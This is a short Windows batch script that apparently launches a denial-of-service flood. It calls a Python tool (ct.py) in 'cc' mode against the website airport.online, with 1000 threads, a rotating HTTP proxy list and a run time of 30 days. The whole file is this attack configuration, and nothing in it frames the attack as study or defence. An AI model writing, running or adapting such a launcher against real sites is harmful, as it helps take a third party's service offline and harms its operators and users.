@echo off
set SETURL="https://airport.online/"
set PROXY="./proxies/"
set VERIFY="-show"
python ct.py -url %SETURL% -m cc -v http -t 1000 -f %PROXY%http.txt -b 1 -s 2592000 %VERIFY%
pause
exit
